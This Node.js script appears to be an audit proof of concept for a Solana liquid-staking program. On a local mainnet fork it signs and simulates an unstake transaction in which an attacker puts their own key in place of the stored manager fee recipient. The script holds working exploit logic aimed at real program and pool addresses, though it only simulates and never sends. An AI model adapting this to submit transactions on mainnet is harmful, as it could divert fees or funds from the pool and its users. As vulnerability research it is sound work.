#!/usr/bin/env node
// Signed, current-mainnet-fork control for LiquidUnstakeStakeAccount.
// Creates an attacker-owned delegated stake in the simulated transaction, then
// compares the canonical stored manager fee route with an attacker substitution.
// No send method exists in this script.
const fs = require('fs');
const crypto = require('crypto');
const modules = '/Users/stacc/Documents/Codex/2026-10-15/goonfi-daybreak-audit/work/audit-tools/node_modules/';
const {
  PublicKey, Keypair, TransactionInstruction, TransactionMessage, SystemProgram,
  StakeProgram, Authorized, Lockup, ComputeBudgetProgram,
} = require(modules + '@solana/web3.js');
const {TOKEN_PROGRAM_ID} = require(modules + '@solana/spl-token');
const {encodeV1} = require('/Users/stacc/the-composer-rescue/composer-runs/2026-10-15/klend-v1-composition.js');
const bs58 = require(modules + 'bs58');

const FORK = process.env.FORK_RPC || 'http://127.0.0.1:8997';
const OUT = process.argv[2] || __dirname + '/signed-fee-route-mutation.json';
const P = (value) => new PublicKey(value);
const PROGRAM = P('2rU1oCHtQ7WJUvy15tKtFvxdYNNSc3id7AzUcjeFSddo');
const POOL = P('9nyw5jxhzuSs88HxKJyDCsWBZMhxj2uNXsFcyHF5KBAb');
const VAULT = P('6RLKARrt6oPCyuMCdYdUHmJxd4wUa6ZeyiC8VSMcYxRv');
const MANAGER = P('F3yy3FVpwq9MV321AzALFcDWZp9XBBHbMas3t4AtEtCW');
const CLOCK = P('SysvarC1ock11111111111111111111111111111111');
const VOTE = P('Vau1t2hwJfbZTMm1m7WetPc1azytdFPobVYbYpKHrW9');
const LIQUID_UNSTAKE_DISC = Buffer.from('06f2f2003de6603a', 'hex');
let rpcId = 0;
async function rpc(method, params) {
  const response = await fetch(FORK, {method: 'POST', headers: {'content-type': 'application/json'},
    body: JSON.stringify({jsonrpc: '2.0', id: ++rpcId, method, params})});
  const body = await response.json();
  if (body.error) throw new Error(`${method}: ${JSON.stringify(body.error)}`);
  return body.result;
}
const u64 = (value) => { const out = Buffer.alloc(8); out.writeBigUInt64LE(BigInt(value)); return out; };
function tokenAmount(account) {
  if (!account?.data || account.owner !== TOKEN_PROGRAM_ID.toBase58()) return null;
  const data = Buffer.from(account.data[0], 'base64');
  return data.length === 165 ? data.readBigUInt64LE(64).toString() : null;
}
function image(account) {
  if (!account) return null;
  const data = Buffer.from(account.data[0], 'base64');
  const result = {owner: account.owner, executable: account.executable, lamports: String(account.lamports),
    dataBytes: data.length, dataSha256: crypto.createHash('sha256').update(data).digest('hex'),
    tokenAmountRaw: tokenAmount(account)};
  if (account.owner === StakeProgram.programId.toBase58() && data.length >= 76) {
    result.stakeStateKind = data.readUInt32LE(0);
    result.staker = bs58.encode(data.subarray(12, 44));
    result.withdrawer = bs58.encode(data.subarray(44, 76));
  }
  return result;
}
function signV1(instructions, payer, controlled, blockhash) {
  const encoded = encodeV1(instructions, payer.publicKey, blockhash);
  const compiled = new TransactionMessage({payerKey: payer.publicKey, recentBlockhash: blockhash,
    instructions}).compileToV0Message();
  const signatureCount = encoded.requiredSignatures;
  const signed = Buffer.from(encoded.wire);
  const message = signed.subarray(0, signed.length - 64 * signatureCount);
  const signerOrder = compiled.staticAccountKeys.slice(0, signatureCount).map(String);
  const keypairs = new Map(controlled.map((keypair) => [keypair.publicKey.toBase58(), keypair]));
  for (let index = 0; index < signerOrder.length; index += 1) {
    const keypair = keypairs.get(signerOrder[index]);
    if (!keypair) throw new Error(`uncontrolled signer ${signerOrder[index]}`);
    const privateKey = crypto.createPrivateKey({key: Buffer.concat([
      Buffer.from('302e020100300506032b657004220420', 'hex'),
      Buffer.from(keypair.secretKey.subarray(0, 32)),
    ]), format: 'der', type: 'pkcs8'});
    crypto.sign(null, message, privateKey)
      .copy(signed, signed.length - 64 * signatureCount + index * 64);
  }
  return {encoded, signed, signerOrder};
}
function compactLogs(logs) {
  return (logs || []).filter((line) => /Instruction:|AnchorError|Error Code:|failed|success|Left:|Right:/.test(line));
}
async function runCase(name, attacker, managerFeeAccount, stakeLamports, rent) {
  const stake = Keypair.generate();
  const info = PublicKey.findProgramAddressSync([
    Buffer.from('stake_account_info'), stake.publicKey.toBuffer(),
  ], PROGRAM)[0];
  const createStake = StakeProgram.createAccount({fromPubkey: attacker.publicKey,
    stakePubkey: stake.publicKey, authorized: new Authorized(attacker.publicKey, attacker.publicKey),
    lockup: new Lockup(0, 0, PublicKey.default), lamports: Number(stakeLamports)}).instructions;
  const delegate = StakeProgram.delegate({stakePubkey: stake.publicKey,
    authorizedPubkey: attacker.publicKey, votePubkey: VOTE}).instructions;
  const target = new TransactionInstruction({programId: PROGRAM, keys: [
    {pubkey: POOL, isSigner: false, isWritable: true},
    {pubkey: attacker.publicKey, isSigner: true, isWritable: true},
    {pubkey: stake.publicKey, isSigner: false, isWritable: true},
    {pubkey: info, isSigner: false, isWritable: true},
    {pubkey: VAULT, isSigner: false, isWritable: true},
    {pubkey: attacker.publicKey, isSigner: true, isWritable: true},
    {pubkey: managerFeeAccount, isSigner: managerFeeAccount.equals(attacker.publicKey), isWritable: true},
    {pubkey: StakeProgram.programId, isSigner: false, isWritable: false},
    {pubkey: TOKEN_PROGRAM_ID, isSigner: false, isWritable: false},
    {pubkey: SystemProgram.programId, isSigner: false, isWritable: false},
    {pubkey: CLOCK, isSigner: false, isWritable: false},
  ], data: Buffer.concat([LIQUID_UNSTAKE_DISC, Buffer.from([1]), u64(1n)])});
  const instructions = [ComputeBudgetProgram.setComputeUnitLimit({units: 500_000}),
    ...createStake, ...delegate, target];
  const watched = [attacker.publicKey, stake.publicKey, info, POOL, VAULT, MANAGER];
  for (const address of watched) await rpc('getAccountInfo', [address.toBase58(),
    {encoding: 'base64', commitment: 'processed'}]);
  const before = await rpc('getMultipleAccounts', [watched.map(String),
    {encoding: 'base64', commitment: 'processed'}]);
  const blockhash = (await rpc('getLatestBlockhash', [{commitment: 'processed'}])).value.blockhash;
  const signed = signV1(instructions, attacker, [attacker, stake], blockhash);
  const simulation = await rpc('simulateTransaction', [signed.signed.toString('base64'), {
    encoding: 'base64', sigVerify: true, replaceRecentBlockhash: false, commitment: 'processed',
    innerInstructions: true, accounts: {encoding: 'base64', addresses: watched.map(String)},
  }]);
  const after = simulation.value.accounts || [];
  const deltas = Object.fromEntries(watched.map((address, index) => {
    const prior = before.value[index], post = after[index];
    return [address.toBase58(), {lamports: prior && post ? String(BigInt(post.lamports) - BigInt(prior.lamports)) : null,
      beforeExists: Boolean(prior), afterExists: Boolean(post)}];
  }));
  return {name, forkPreSlot: before.context.slot, simulationSlot: simulation.context.slot,
    stakeAccount: stake.publicKey.toBase58(), stakeInfoPda: info.toBase58(),
    syntheticStakeLamports: stakeLamports.toString(), rentLamports: rent.toString(),
    managerFeeAccount: managerFeeAccount.toBase58(), signed: true, sigVerify: true,
    liveSubmission: false, wire: {version: 1, bytes: signed.encoded.sizeBytes,
      addresses: signed.encoded.addressCount, instructions: signed.encoded.instructionCount,
      requiredSignatures: signed.encoded.requiredSignatures, signerOrder: signed.signerOrder,
      signedSha256: crypto.createHash('sha256').update(signed.signed).digest('hex')},
    err: simulation.value.err || null, unitsConsumed: simulation.value.unitsConsumed,
    logs: simulation.value.logs || [], compactLogs: compactLogs(simulation.value.logs),
    watched: watched.map(String), before: before.value.map(image), after: after.map(image), deltas};
}
async function main() {
  const genesis = await rpc('getGenesisHash', []);
  const attacker = Keypair.generate();
  await rpc('surfnet_setAccount', [attacker.publicKey.toBase58(), {data: '', executable: false,
    lamports: 5_000_000_000, owner: SystemProgram.programId.toBase58(), rentEpoch: 0}]);
  const rent = BigInt(await rpc('getMinimumBalanceForRentExemption', [StakeProgram.space,
    {commitment: 'processed'}]));
  const stakeLamports = rent + 1_000_000_000n;
  const canonical = await runCase('canonical_stored_manager_fee_positive_control', attacker, MANAGER,
    stakeLamports, rent);
  const substitute = await runCase('attacker_substitutes_manager_fee_recipient', attacker,
    attacker.publicKey, stakeLamports, rent);
  const report = {generatedAt: new Date().toISOString(), network: 'mainnet-beta local Surfpool fork',
    genesis, upstreamClass: 'public keyless mainnet RPC', targetProgram: PROGRAM.toBase58(),
    targetPool: POOL.toBase58(), safety: {freshEphemeralKeys: true, privateKeysSaved: false,
      syntheticMutation: 'only fresh attacker system balance; stake account is created, initialized and delegated by signed Solana instructions',
      allSimulationsSigVerifyTrue: true, sendMethodCalled: false},
    currentMainnetLayoutSource: {signature: 'rrjH9bUcMiQeEQ7K97cMSStP5Dc8gXZmDNvpMJik2Q8Uorw65gS6nKTUatYn37cZMBj8WzuYkEUA3MYAG6oqG6B',
      slot: 458733846, discriminatorHex: LIQUID_UNSTAKE_DISC.toString('hex')},
    cases: [canonical, substitute]};
  fs.writeFileSync(OUT, JSON.stringify(report, null, 2) + '\n');
  console.log(JSON.stringify({out: OUT, cases: report.cases.map((row) => ({name: row.name,
    slot: row.simulationSlot, err: row.err, units: row.unitsConsumed, wire: row.wire,
    compactLogs: row.compactLogs, deltas: row.deltas}))}));
}
main().catch((error) => { console.error(error.stack || error); process.exitCode = 1; });
